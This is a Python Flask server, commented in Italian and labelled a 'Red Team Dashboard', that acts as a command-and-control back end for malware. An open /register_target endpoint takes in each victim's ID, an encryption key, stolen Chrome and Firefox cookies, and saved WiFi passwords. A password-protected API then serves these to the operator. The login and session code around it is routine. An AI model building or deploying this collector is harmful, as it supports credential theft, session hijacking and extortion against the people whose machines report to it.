from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from datetime import datetime, timedelta
import configparser
import os
from functools import wraps
from password_manager import password_manager

app = Flask(__name__)

# Carica configurazione generale
config = configparser.ConfigParser()
config.read('config.txt')

app.secret_key = config.get('server', 'secret_key')
SERVER_CONFIG = {
    'host': config.get('server', 'host'),
    'port': config.getint('server', 'port'),
    'session_timeout': config.getint('session', 'timeout', fallback=3600),
    'max_login_attempts': config.getint('session', 'max_login_attempts', fallback=5)
}

# Database in memoria
targets_db = {}
cookies_db = {}
wifi_db = {}

# Protezione login
failed_attempts = {}
lockouts = {}

# ========== FUNZIONI HELPER ==========
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        if check_session_timeout():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def check_session_timeout():
    """Verifica se la sessione è scaduta"""
    if 'login_time' in session:
        elapsed_time = datetime.now().timestamp() - session['login_time']
        if elapsed_time > SERVER_CONFIG['session_timeout']:
            session.clear()
            return True
    return False

def is_ip_locked(ip):
    """Verifica se l'IP è bloccato"""
    if ip in lockouts:
        lockout_time = lockouts[ip]
        if datetime.now() < lockout_time:
            return True
        else:
            # Rimuovi lock scaduto
            del lockouts[ip]
            if ip in failed_attempts:
                del failed_attempts[ip]
    return False

# ========== MIDDLEWARE ==========
@app.before_request
def require_login():
    # Route pubbliche che non richiedono login
    public_routes = ['login', 'static', 'register_target', 'setup_redirect']
    
    # Se l'endpoint non è nelle route pubbliche e l'utente non è loggato
    if request.endpoint and request.endpoint not in public_routes:
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        if check_session_timeout():
            return redirect(url_for('login'))

# ========== ROUTE PUBBLICHE ==========
@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    
    # Verifica se IP è bloccato
    if is_ip_locked(client_ip):
        remaining = lockouts[client_ip] - datetime.now()
        minutes = int(remaining.total_seconds() / 60)
        return render_template('login.html', 
                             error=f'Account bloccato. Riprova tra {minutes} minuti')
    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        # Verifica credenziali in modo sicuro
        is_valid = password_manager.verify_password(password, username)
        
        if is_valid:
            # Reset tentativi falliti
            if client_ip in failed_attempts:
                del failed_attempts[client_ip]
            
            # Crea sessione
            session['logged_in'] = True
            session['username'] = username
            session['login_time'] = datetime.now().timestamp()
            session['user_agent'] = request.headers.get('User-Agent', '')
            
            print(f"✅ Login successful: {username} from {client_ip}")
            return redirect(url_for('dashboard'))
        else:
            # Gestione tentativi falliti
            failed_attempts[client_ip] = failed_attempts.get(client_ip, 0) + 1
            attempts_left = SERVER_CONFIG['max_login_attempts'] - failed_attempts[client_ip]
            
            if failed_attempts[client_ip] >= SERVER_CONFIG['max_login_attempts']:
                # Blocca IP per 30 minuti
                lockouts[client_ip] = datetime.now() + timedelta(minutes=30)
                print(f"🚫 IP blocked: {client_ip} after {failed_attempts[client_ip]} failed attempts")
                return render_template('login.html', 
                                     error='Troppi tentativi falliti. IP bloccato per 30 minuti.')
            else:
                print(f"❌ Failed login: {username} from {client_ip} (attempt {failed_attempts[client_ip]})")
                return render_template('login.html', 
                                     error=f'Credenziali non valide. Tentativi rimasti: {attempts_left}')
    
    return render_template('login.html')

@app.route('/register_target', methods=['POST'])
def register_target():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'status': 'error', 'message': 'No data received'}), 400
            
        target_id = data.get('target_id', 'unknown')
        encryption_key = data.get('encryption_key', 'no-key')
        
        targets_db[target_id] = {
            'encryption_key': encryption_key,
            'registration_time': datetime.now().isoformat(),
            'status': 'active',
            'ip_address': request.remote_addr
        }
        
        # Salva cookies se presenti
        if 'cookies' in data:
            cookies_db[target_id] = {
                'chrome': data['cookies'].get('chrome', []),
                'firefox': data['cookies'].get('firefox', []),
                'total_cookies': len(data['cookies'].get('chrome', [])) + 
                                len(data['cookies'].get('firefox', []))
            }
        else:
            cookies_db[target_id] = {'chrome': [], 'firefox': [], 'total_cookies': 0}
        
        # Salva WiFi se presente
        if 'wifi_passwords' in data:
            wifi_db[target_id] = data['wifi_passwords']
        else:
            wifi_db[target_id] = []
        
        print(f"🎯 New target registered: {target_id} from {request.remote_addr}")
        return jsonify({'status': 'success'})
    
    except Exception as e:
        print(f"❌ Error registering target: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ========== ROUTE PROTETTE ==========
@app.route('/')
def index():
    """Route principale - reindirizza al login"""
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    """Dashboard principale"""
    return render_template('dashboard.html')

@app.route('/logout')
def logout():
    """Logout utente"""
    client_ip = request.remote_addr
    username = session.get('username', 'unknown')
    
    session.clear()
    print(f"🔒 Logout: {username} from {client_ip}")
    return redirect(url_for('login'))

@app.route('/api/targets')
@login_required
def get_targets():
    """API per ottenere dati dei target"""
    return jsonify({
        'targets': targets_db,
        'cookies': cookies_db,
        'wifi': wifi_db
    })

@app.route('/api/change_password', methods=['POST'])
@login_required
def change_password():
    """API per cambiare password"""
    data = request.get_json()
    current_password = data.get('current_password', '')
    new_password = data.get('new_password', '')
    
    # Verifica password corrente
    current_valid = password_manager.verify_password(
        current_password, 
        session.get('username', '')
    )
    
    if current_valid:
        if len(new_password) < 8:
            return jsonify({'error': 'La nuova password deve essere di almeno 8 caratteri'}), 400
        
        # Aggiorna password
        password_manager.set_credentials(session['username'], new_password)
        
        print(f"✅ Password changed for user: {session['username']}")
        return jsonify({'status': 'success'})
    else:
        return jsonify({'error': 'Password corrente non valida'}), 400

@app.route('/setup')
def setup_redirect():
    """Pagina di setup"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Setup Required</title>
        <style>
            body { font-family: Arial; background: #1a1a1a; color: white; padding: 50px; }
            .container { max-width: 600px; margin: 0 auto; background: #2a2a2a; padding: 30px; border-radius: 10px; }
            code { background: #000; padding: 10px; display: block; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔧 Setup Required</h1>
            <p>Run the setup script to configure the server:</p>
            <code>python setup_server.py</code>
            <p><a href="/login" style="color: #00ff00;">← Back to Login</a></p>
        </div>
    </body>
    </html>
    """

# ========== ROUTE DI DEBUG ==========
@app.route('/debug/routes')
def debug_routes():
    """Route di debug per vedere tutte le route disponibili"""
    routes = []
    for rule in app.url_map.iter_rules():
        routes.append({
            'endpoint': rule.endpoint,
            'methods': list(rule.methods),
            'path': str(rule)
        })
    
    return jsonify({
        'routes': routes,
        'targets_count': len(targets_db),
        'session_logged_in': session.get('logged_in', False)
    })

# ========== AVVIO SERVER ==========
if __name__ == '__main__':
    # Verifica che il server sia configurato
    if not password_manager.is_configured():
        print("❌ Server non configurato!")
        print("💡 Esegui prima: python setup_server.py")
        exit(1)
    
    # Verifica che i template esistano
    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
    login_template = os.path.join(template_dir, 'login.html')
    dashboard_template = os.path.join(template_dir, 'dashboard.html')
    
    if not os.path.exists(login_template):
        print(f"❌ Template login.html non trovato in: {login_template}")
        exit(1)
    
    if not os.path.exists(dashboard_template):
        print(f"❌ Template dashboard.html non trovato in: {dashboard_template}")
        exit(1)
    
    print(f"🚀 Starting Red Team Dashboard...")
    print(f"📊 URL: http://localhost:{SERVER_CONFIG['port']}")
    print(f"🔑 Username: {password_manager.get_username()}")
    print(f"⏰ Session timeout: {SERVER_CONFIG['session_timeout']}s")
    print("=" * 50)
    print("📍 Available routes:")
    print("   GET  /                 → Redirect to login")
    print("   GET  /login            → Login page")
    print("   POST /login            → Login action")
    print("   GET  /dashboard        → Main dashboard")
    print("   GET  /logout           → Logout")
    print("   POST /register_target  → Target registration API")
    print("   GET  /api/targets      → Targets data API")
    print("   POST /api/change_password → Change password API")
    print("   GET  /debug/routes     → Debug routes")
    print("=" * 50)
    
    try:
        app.run(
            host=SERVER_CONFIG['host'], 
            port=SERVER_CONFIG['port'], 
            debug=True
        )
    except Exception as e:
        print(f"❌ Error starting server: {e}")
        print("💡 Check if port 8573 is available")
